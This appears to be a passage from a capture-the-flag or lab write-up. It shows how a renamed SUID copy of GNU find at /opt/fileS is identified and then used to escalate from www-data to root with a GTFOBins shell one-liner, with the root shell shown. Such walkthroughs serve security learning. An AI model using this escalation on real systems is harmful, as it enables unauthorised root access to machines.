
---

## Enumeration

When an binary us unknown, our first initiative is to find out what it can do.

```
/opt/fileS --help
```

Assuming the binary was just renamed and is an default binary with SUID set. Let's check for version!

```
www-data@mzeeav:/opt$ /opt/fileS --version
find (GNU findutils) 4.8.0
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Eric B. Decker, James Youngman, and Kevin Dalley.
Features enabled: D_TYPE O_NOFOLLOW(enabled) LEAF_OPTIMISATION FTS(FTS_CWDFD) CBO(level=2)
```

## PoC

The /opt/fileS binary is an /find binary, we can utilize following PoC from www.gtfobins.github.io to escalate to "root".

```
www-data@mzeeav:/opt$ /opt/fileS . -exec /bin/sh -p \; -quit
# whoami
root
```
